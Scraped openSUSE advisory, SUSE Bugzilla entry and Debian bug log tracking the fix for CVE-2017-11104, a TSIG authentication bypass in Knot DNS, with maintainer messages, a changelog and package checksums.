=== Content from lists.opensuse.org_3277a348_20250125_055256.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/#EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5)

# [security-announce] openSUSE-SU-2020:1086-1: moderate: Security update for knot

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

26 Jul
2020

26 Jul
'20

19:17

openSUSE Security Update: Security update for knot
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2020:1086-1
Rating: moderate
References: #1047841
Cross-References: CVE-2017-11104
Affected Products:
openSUSE Leap 15.2
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
This update for knot fixes the following issues:
- CVE-2017-11104: Fixed an improper implementation of TSIG protocol which
could have allowed an attacker with a valid key name and algorithm to
bypass TSIG authentication (boo#1047841).
Patch Instructions:
To install this openSUSE Security Update use the SUSE recommended installation methods
like YaST online\_update or "zypper patch".
Alternatively you can run the command listed for your product:
- openSUSE Leap 15.2:
zypper in -t patch openSUSE-2020-1086=1
Package List:
- openSUSE Leap 15.2 (x86\_64):
knot-1.6.8-lp152.5.3.1
knot-debuginfo-1.6.8-lp152.5.3.1
knot-debugsource-1.6.8-lp152.5.3.1
References:
<https://www.suse.com/security/cve/CVE-2017-11104.html>
<https://bugzilla.suse.com/1047841>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5/#EDKX5CE6MK2VASOOPBWA54NF2Y3GTCZ5)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from bugzilla.suse.com_4b14f14f_20250126_062844.html ===


| Bugzilla – Bug 1047841 | VUL-0: CVE-2017-11104: knot: bypass TSIG authentication | Last modified: 2020-10-27 16:08:46 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1047841)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 1047841**](show_bug.cgi?id=1047841)
(CVE-2017-11104)
- VUL-0: CVE-2017-11104: knot: bypass TSIG authentication

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2017-11104: knot: bypass TSIG authentication

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2017-11104 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | openSUSE Distribution | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | openSUSE | | [Component:](describecomponents.cgi?product=openSUSE Distribution "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Security ([show other bugs](buglist.cgi?component=Security&product=openSUSE%20Distribution&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | Leap 15.1 | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All All | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P3 - Medium **Severity**: Normal ([vote](page.cgi?id=voting/user.html&bug_id=1047841#vote_1047841)) | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | Leap 15.1 | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | E-mail List | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") | <https://smash.suse.de/issue/188206/> | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2017-07-08 12:59 UTC by Marcus Meissner | | --- | --- | | Modified: | 2020-10-27 16:08 UTC ([History](show_activity.cgi?id=1047841)) | | CC List: | 4 users (show)  astieger atoptsoglou mrueckert smash\_bz | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | Security Response Team | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=1047841) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [Add an attachment](attachment.cgi?bugid=1047841&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=1047841&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1047841#c0)  Marcus Meissner   2017-07-08 12:59:08 UTC  ``` CVE-2017-11104  Knot DNS before 2.4.5 and 2.5.x before 2.5.2 contains a flaw within the TSIG protocol implementation that would allow an attacker with a valid key name and algorithm to bypass TSIG authentication if no additional ACL restrictions are set, because of an improper TSIG validity period check.   References: <http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2017-11104> <http://www.synacktiv.ninja/ressources/Knot_DNS_TSIG_Signature_Forgery.pdf> <https://bugs.debian.org/865678> <https://lists.nic.cz/pipermail/knot-dns-users/2017-June/001144.html> ``` [Comment 1](show_bug.cgi?id=1047841#c1)  Tomáš Chvátal   2017-07-10 11:50:09 UTC  ``` @darix: any idea if we plan to switch to knot2 and integrate it in TW (Petr is on vacation). ``` [Comment 2](show_bug.cgi?id=1047841#c2)  Marcus Rückert   2017-07-17 10:34:43 UTC  ``` I havent submitted it to TW ... and i leave it to the TW maintainer to decide to switch to it or not. ``` [Comment 3](show_bug.cgi?id=1047841#c3)  Petr Gajdos   2017-07-21 14:10:45 UTC  ``` I was merely helping Ondrej with packaging, but unfortunately I do not know much about knot itself. ``` [Comment 4](show_bug.cgi?id=1047841#c4)  Petr Gajdos   2018-05-11 16:29:02 UTC  ``` Request Tumbleweed and openSUSE:Leap:15.0 drop. ``` [Comment 5](show_bug.cgi?id=1047841#c5)  Petr Gajdos   2018-05-11 17:07:36 UTC  ``` Submitted for 42.3/knot. ``` [Comment 6](show_bug.cgi?id=1047841#c6)  Swamp Workflow Management   2018-05-11 17:40:05 UTC  ``` This is an autogenerated message for OBS integration: This bug (1047841) was mentioned in <https://build.opensuse.org/request/show/606511> 42.3 / knot ``` [Comment 7](show_bug.cgi?id=1047841#c7)  Andreas Stieger   2018-05-19 15:04:45 UTC  ``` (In reply to Petr Gajdos from [comment #4](show_bug.cgi?id=1047841#c4)) > Request Tumbleweed and openSUSE:Leap:15.0 drop.  This package remains in 15.0. Can you please submit to Maintenance for 15.0 also? ``` [Comment 8](show_bug.cgi?id=1047841#c8)  Swamp Workflow Management   2018-05-23 19:24:40 UTC  ``` openSUSE-SU-2018:1395-1: An update that fixes one vulnerability is now available.  Category: security (moderate) Bug References: 1047841 CVE References: CVE-2017-11104 Sources used: openSUSE Leap 42.3 (src):    knot-1.6.5-5.3.1 ``` [Comment 9](show_bug.cgi?id=1047841#c9)  Alexandros Toptsoglou   2020-07-23 07:59:26 UTC  ``` It is removed from Factory but still in Leap 15.1 and 15.2 ``` [Comment 11](show_bug.cgi?id=1047841#c11)  OBSbugzilla Bot   2020-07-23 09:40:07 UTC  ``` This is an autogenerated message for OBS integration: This bug (1047841) was mentioned in <https://build.opensuse.org/request/show/822339> 15.1 / knot <https://build.opensuse.org/request/show/822340> 15.2 / knot ``` [Comment 12](show_bug.cgi?id=1047841#c12)  Swamp Workflow Management   2020-07-26 19:12:56 UTC  ``` openSUSE-SU-2020:1085-1: An update that fixes one vulnerability is now available.  Category: security (moderate) Bug References: 1047841 CVE References: CVE-2017-11104 Sources used: openSUSE Leap 15.1 (src):    knot-1.6.8-lp151.4.3.1 ``` [Comment 13](show_bug.cgi?id=1047841#c13)  Swamp Workflow Management   2020-07-26 19:17:59 UTC  ``` openSUSE-SU-2020:1086-1: An update that fixes one vulnerability is now available.  Category: security (moderate) Bug References: 1047841 CVE References: CVE-2017-11104 Sources used: openSUSE Leap 15.2 (src):    knot-1.6.8-lp152.5.3.1 ``` [Comment 14](show_bug.cgi?id=1047841#c14)  Swamp Workflow Management   2020-07-29 22:18:18 UTC  ``` openSUSE-SU-2020:1112-1: An update that fixes one vulnerability is now available.  Category: security (moderate) Bug References: 1047841 CVE References: CVE-2017-11104 JIRA References:  Sources used: openSUSE Backports SLE-15-SP1 (src):    knot-1.6.8-bp151.4.3.1 ``` [Comment 15](show_bug.cgi?id=1047841#c15)  Swamp Workflow Management   2020-09-18 16:41:28 UTC  ``` openSUSE-SU-2020:1232-1: An update that fixes one vulnerability is now available.  Category: security (moderate) Bug References: 1047841 CVE References: CVE-2017-11104 JIRA References:  Sources used: openSUSE Backports SLE-15-SP2 (src):    knot-1.6.8-bp152.4.3.1 ``` [Comment 16](show_bug.cgi?id=1047841#c16)  Alexandros Toptsoglou   2020-10-27 16:08:46 UTC  ``` Done ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=1047841)
* - [XML](show_bug.cgi?ctype=xml&id=1047841)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=1047841)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D1047841)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from bugs.debian.org_0b1b5e3f_20250125_055302.html ===

# Debian Bug report logs - #865678 knot: CVE-2017-11104: Improper TSIG validity period check can allow TSIG forgery

[![version graph](version.cgi?found=knot%2F2.4.3-1;found=knot%2F1.6.0-1;found=knot%2F2.5.1-1;found=knot%2F2.4.0-3;package=src%3Aknot;fixed=knot%2F2.5.3-1;fixed=knot%2F1.6.0-1%2Bdeb8u1;fixed=knot%2F2.4.0-3%2Bdeb9u1;collapse=1;height=2;width=2;absolute=0)](version.cgi?absolute=0;info=1;found=knot%2F2.4.3-1;found=knot%2F1.6.0-1;found=knot%2F2.5.1-1;found=knot%2F2.4.0-3;package=src%3Aknot;collapse=1;fixed=knot%2F2.5.3-1;fixed=knot%2F1.6.0-1%2Bdeb8u1;fixed=knot%2F2.4.0-3%2Bdeb9u1)

Package:
[src:knot](pkgreport.cgi?src=knot);
Maintainer for [src:knot](pkgreport.cgi?src=knot) is [knot packagers <knot@packages.debian.org>](pkgreport.cgi?maint=knot%40packages.debian.org);

Reported by: [Salvatore Bonaccorso <carnil@debian.org>](pkgreport.cgi?submitter=carnil%40debian.org)

Date: Fri, 23 Jun 2017 17:03:01 UTC

Severity: *grave*

Tags: patch, security, upstream

Found in versions knot/2.4.3-1, knot/1.6.0-1, knot/2.5.1-1, knot/2.4.0-3

Fixed in versions knot/2.5.3-1, knot/1.6.0-1+deb8u1, knot/2.4.0-3+deb9u1

**Done:** Yves-Alexis Perez <corsac@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=865678;mbox=yes), [status mbox](bugreport.cgi?bug=865678;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=865678;mbox=yes;mboxmaint=yes)

---

**Report forwarded**
to `debian-bugs-dist@lists.debian.org, carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`:

`Bug#865678`; Package `src:knot`.
(Fri, 23 Jun 2017 17:03:04 GMT) ([full text](bugreport.cgi?bug=865678;msg=2), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

New Bug report received and forwarded. Copy sent to `carnil@debian.org, team@security.debian.org, secure-testing-team@lists.alioth.debian.org, Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`.
(Fri, 23 Jun 2017 17:03:04 GMT) ([full text](bugreport.cgi?bug=865678;msg=4), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=865678;msg=5), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: knot: Improper TSIG validity period check can allow TSIG forgery
Date: Fri, 23 Jun 2017 19:01:49 +0200
```
Source: knot
Version: 2.4.3-1
Severity: grave
Tags: security upstream patch
Control: found -1 2.5.1-1

Hi

See
<https://lists.nic.cz/pipermail/knot-dns-users/2017-June/001144.html>
and
<http://www.synacktiv.ninja/ressources/Knot_DNS_TSIG_Signature_Forgery.pdf>
and filling a bug in BTS to have a reference, afaik there is no CVE
yet assigned.

[16:19] < KGB-1> Yves-Alexis Perez 52846  /data/CVE/list add temporary entry for knot
[16:21] < Corsac> ondrej: I guess you know about it?

Please adjust the affected versions in the BTS as needed.

Regards,
Salvatore

```

---

**Marked as found in versions knot/2.5.1-1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `submit@bugs.debian.org`.
(Fri, 23 Jun 2017 17:03:04 GMT) ([full text](bugreport.cgi?bug=865678;msg=7), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=7), [link](#6)).

---

**Marked as found in versions knot/2.4.0-3.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Thu, 29 Jun 2017 19:45:06 GMT) ([full text](bugreport.cgi?bug=865678;msg=9), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=9), [link](#8)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`:

`Bug#865678`; Package `src:knot`.
(Sat, 08 Jul 2017 12:36:03 GMT) ([full text](bugreport.cgi?bug=865678;msg=11), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=11), [link](#10)).

---

**Acknowledgement sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`.
(Sat, 08 Jul 2017 12:36:03 GMT) ([full text](bugreport.cgi?bug=865678;msg=13), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=13), [link](#12)).

---

[Message #14](#14) received at 865678@bugs.debian.org ([full text](bugreport.cgi?bug=865678;msg=14), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=14), reply):

![](/cgi-bin/libravatar.cgi?email=carnil%40debian.org)
From: Salvatore Bonaccorso <carnil@debian.org>
To: 865678@bugs.debian.org
Subject: Re: Bug#865678: knot: Improper TSIG validity period check can allow
TSIG forgery
Date: Sat, 8 Jul 2017 14:33:50 +0200
```
Control: retitle -1 knot: [CVE-2017-11104](https://security-tracker.debian.org/tracker/CVE-2017-11104): Improper TSIG validity period check can allow TSIG forgery

On Fri, Jun 23, 2017 at 07:01:49PM +0200, Salvatore Bonaccorso wrote:
> Source: knot
> Version: 2.4.3-1
> Severity: grave
> Tags: security upstream patch
> Control: found -1 2.5.1-1
>
> Hi
>
> See
> <https://lists.nic.cz/pipermail/knot-dns-users/2017-June/001144.html>
> and
> <http://www.synacktiv.ninja/ressources/Knot_DNS_TSIG_Signature_Forgery.pdf>
> and filling a bug in BTS to have a reference, afaik there is no CVE
> yet assigned.
>
> [16:19] < KGB-1> Yves-Alexis Perez 52846  /data/CVE/list add temporary entry for knot
> [16:21] < Corsac> ondrej: I guess you know about it?
>
> Please adjust the affected versions in the BTS as needed.

This now was assigned [CVE-2017-11104](https://security-tracker.debian.org/tracker/CVE-2017-11104).

Regards,
Salvatore

```

---

**Changed Bug title to 'knot: CVE-2017-11104: Improper TSIG validity period check can allow TSIG forgery' from 'knot: Improper TSIG validity period check can allow TSIG forgery'.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `865678-submit@bugs.debian.org`.
(Sat, 08 Jul 2017 12:36:03 GMT) ([full text](bugreport.cgi?bug=865678;msg=16), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=16), [link](#15)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`:

`Bug#865678`; Package `src:knot`.
(Fri, 14 Jul 2017 20:12:03 GMT) ([full text](bugreport.cgi?bug=865678;msg=18), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=18), [link](#17)).

---

**Acknowledgement sent**
to `Yves-Alexis Perez <corsac@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`.
(Fri, 14 Jul 2017 20:12:03 GMT) ([full text](bugreport.cgi?bug=865678;msg=20), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=20), [link](#19)).

---

[Message #21](#21) received at 865678@bugs.debian.org ([full text](bugreport.cgi?bug=865678;msg=21), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=21), reply):

![](/cgi-bin/libravatar.cgi?email=corsac%40debian.org)
From: Yves-Alexis Perez <corsac@debian.org>
To: 865678@bugs.debian.org, Ondřej Surý
<ondrej@sury.org>
Cc: team@security.debian.org
Subject: Re: Bug#865678: knot: Improper TSIG validity period check can allow
TSIG forgery
Date: Fri, 14 Jul 2017 22:09:28 +0200
```
[[Message part 1](bugreport.cgi?att=0;bug=865678;msg=21) (text/plain, inline)]
```
```
On Fri, 2017-06-23 at 19:01 +0200, Salvatore Bonaccorso wrote:
> Source: knot
> Version: 2.4.3-1
> Severity: grave
> Tags: security upstream patch
> Control: found -1 2.5.1-1
>
> Hi
>
> See
> <https://lists.nic.cz/pipermail/knot-dns-users/2017-June/001144.html>
> and
> <http://www.synacktiv.ninja/ressources/Knot_DNS_TSIG_Signature_Forgery.pdf>
> and filling a bug in BTS to have a reference, afaik there is no CVE
> yet assigned.
>
> [16:19] < KGB-1> Yves-Alexis Perez 52846  /data/CVE/list add temporary entry
> for knot
> [16:21] < Corsac> ondrej: I guess you know about it?

I went ahead and uploaded fixes to jessie and stretch. I've also pushed my
branches to <https://anonscm.debian.org/cgit/users/corsac/security/knot.git/> in
case you want to reimport them.

Regards,
--
Yves-Alexis
```
```
[[signature.asc](bugreport.cgi?att=1;bug=865678;filename=signature.asc;msg=21) (application/pgp-signature, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`:

`Bug#865678`; Package `src:knot`.
(Sat, 15 Jul 2017 05:24:02 GMT) ([full text](bugreport.cgi?bug=865678;msg=23), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=23), [link](#22)).

---

**Acknowledgement sent**
to `Ondřej Surý <ondrej@sury.org>`:

Extra info received and forwarded to list. Copy sent to `Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>`.
(Sat, 15 Jul 2017 05:24:02 GMT) ([full text](bugreport.cgi?bug=865678;msg=25), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=25), [link](#24)).

---

[Message #26](#26) received at 865678@bugs.debian.org ([full text](bugreport.cgi?bug=865678;msg=26), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=26), reply):

![](/cgi-bin/libravatar.cgi?email=ondrej%40sury.org)
From: Ondřej Surý <ondrej@sury.org>
To: "Yves-Alexis Perez" <corsac@debian.org>, <865678@bugs.debian.org>
Cc: <team@security.debian.org>
Subject: Re: [Pkg-dns-devel] Bug#865678: knot: Improper TSIG validity period check can allow TSIG forgery
Date: Sat, 15 Jul 2017 07:20:56 +0200
```
Thanks for the upload. I didn't give it a very high priority as there was
an easy fix using ACLs and I had a rough plan to fix it during next week.

Cheers, Ondřej

On 14 July 2017 22:12:11 Yves-Alexis Perez <corsac@debian.org> wrote:

> On Fri, 2017-06-23 at 19:01 +0200, Salvatore Bonaccorso wrote:
>> Source: knot
>> Version: 2.4.3-1
>> Severity: grave
>> Tags: security upstream patch
>> Control: found -1 2.5.1-1
>>
>> Hi
>>
>> See
>> <https://lists.nic.cz/pipermail/knot-dns-users/2017-June/001144.html>
>> and
>> <http://www.synacktiv.ninja/ressources/Knot_DNS_TSIG_Signature_Forgery.pdf>
>> and filling a bug in BTS to have a reference, afaik there is no CVE
>> yet assigned.
>>
>> [16:19] < KGB-1> Yves-Alexis Perez 52846  /data/CVE/list add temporary entry
>> for knot
>> [16:21] < Corsac> ondrej: I guess you know about it?
>
> I went ahead and uploaded fixes to jessie and stretch. I've also pushed my
> branches to <https://anonscm.debian.org/cgit/users/corsac/security/knot.git/> in
> case you want to reimport them.
>
> Regards,
> --
> Yves-Alexis
>
>
> ----------
> _______________________________________________
> pkg-dns-devel mailing list
> pkg-dns-devel@lists.alioth.debian.org
> <https://lists.alioth.debian.org/mailman/listinfo/pkg-dns-devel>
>

```

---

**Reply sent**
to `Yves-Alexis Perez <corsac@debian.org>`:

You have taken responsibility.
(Sat, 15 Jul 2017 20:51:06 GMT) ([full text](bugreport.cgi?bug=865678;msg=28), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=28), [link](#27)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Sat, 15 Jul 2017 20:51:06 GMT) ([full text](bugreport.cgi?bug=865678;msg=30), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=30), [link](#29)).

---

[Message #31](#31) received at 865678-close@bugs.debian.org ([full text](bugreport.cgi?bug=865678;msg=31), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=31), reply):

![](/cgi-bin/libravatar.cgi?email=corsac%40debian.org)
From: Yves-Alexis Perez <corsac@debian.org>
To: 865678-close@bugs.debian.org
Subject: Bug#865678: fixed in knot 1.6.0-1+deb8u1
Date: Sat, 15 Jul 2017 20:47:53 +0000
```
Source: knot
Source-Version: 1.6.0-1+deb8u1

We believe that the bug you reported is fixed in the latest version of
knot, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 865678@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Yves-Alexis Perez <corsac@debian.org> (supplier of updated knot package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Fri, 14 Jul 2017 14:11:36 +0200
Source: knot
Binary: knot knot-libs knot-dbg knot-dnsutils knot-host knot-doc
Architecture: source amd64 all
Version: 1.6.0-1+deb8u1
Distribution: jessie-security
Urgency: high
Maintainer: Ondřej Surý <ondrej@debian.org>
Changed-By: Yves-Alexis Perez <corsac@debian.org>
Description:
 knot       - authoritative domain name server
 knot-dbg   - Debug symbols for Knot DNS
 knot-dnsutils - Clients provided with Knot DNS (kdig, knslookup, knsupdate)
 knot-doc   - Documentation for Knot DNS
 knot-host  - Version of 'host' bundled with Knot DNS
 knot-libs  - authoritative domain name server
Closes: [865678](bugreport.cgi?bug=865678)
Changes:
 knot (1.6.0-1+deb8u1) jessie-security; urgency=high
 .
   * Non-maintainer upload by the Security Team.
   * debian/patches:
     - 0001-tsig-move-signature-validity-period-check-after-the- added, fix
     TSIG signature validation bypass ([CVE-2017-11104](https://security-tracker.debian.org/tracker/CVE-2017-11104))           closes: #[865678](bugreport.cgi?bug=865678)
Checksums-Sha1:
 c98698e4096f9d7f98cc0923c1c5b152fd3e4016 2018 knot_1.6.0-1+deb8u1.dsc
 7c005d549bf8946743b8e02a1369a94b92ba1629 781192 knot_1.6.0.orig.tar.xz
 e35bed027d7d6023d35fac7498ba796a1775b285 17744 knot_1.6.0-1+deb8u1.debian.tar.xz
 3d7babb3008aa1ded4b20c8a55cdab242d7a7517 203532 knot_1.6.0-1+deb8u1_amd64.deb
 8a421826543ccbcbf1daf4c51d97afdc64b7c929 168174 knot-libs_1.6.0-1+deb8u1_amd64.deb
 330f721d0d83dcb741b816ae75ea2606b2cee2e9 1773014 knot-dbg_1.6.0-1+deb8u1_amd64.deb
 5e915b33be3ce5bb3d10ca7d880e6c5ad51f3c64 66904 knot-dnsutils_1.6.0-1+deb8u1_amd64.deb
 5f936812663b3879ed61e554b73ef1759ff71520 49744 knot-host_1.6.0-1+deb8u1_amd64.deb
 ea7d8cdcf0959fdef08cb29841b64806bde10064 448320 knot-doc_1.6.0-1+deb8u1_all.deb
Checksums-Sha256:
 e8c6babce53b8d885e63f276e14ac1051147f8094c8a68aa970dba729b3933a8 2018 knot_1.6.0-1+deb8u1.dsc
 38d6c19c70f0640bc9331afd1bee61196c647f138f4d36bdea7d0e1b49514f46 781192 knot_1.6.0.orig.tar.xz
 169dfa98ce408d00add4b93c73246443834c730f0910f9147bf275ab3a8d92e1 17744 knot_1.6.0-1+deb8u1.debian.tar.xz
